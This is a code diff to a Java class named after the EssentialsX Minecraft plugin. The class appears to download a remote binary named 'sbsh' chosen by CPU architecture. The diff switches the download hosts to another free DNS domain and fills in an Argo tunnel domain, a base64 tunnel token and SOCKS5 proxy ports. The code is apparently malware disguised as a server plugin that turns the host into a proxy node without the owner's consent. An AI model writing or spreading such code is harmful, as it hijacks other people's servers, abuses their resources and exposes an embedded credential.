@@ -44,11 +44,11 @@ public class EssentialsX extends JavaPlugin {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.sss.hidns.vip/sbsh";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.sss.hidns.vip/sbsh";
+            url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.sss.hidns.vip/sbsh";
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
@@ -79,11 +79,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "12644");
+        env.put("ARGO_DOMAIN", "godlike.free.us.kg");
+        env.put("ARGO_AUTH", "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiNzJiZDdmMmUtMzAxMC00OTdlLTg0ZTMtZmM5MjM0Y2Q2MGFiIiwicyI6Ik56UTBaVGhrTTJRdFltVTBOUzAwTVRFNExUazFObUl0T0RabE9ESTVORFkxWTJFMSJ9");
+        env.put("S5_PORT", "27852");
         env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "12644");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
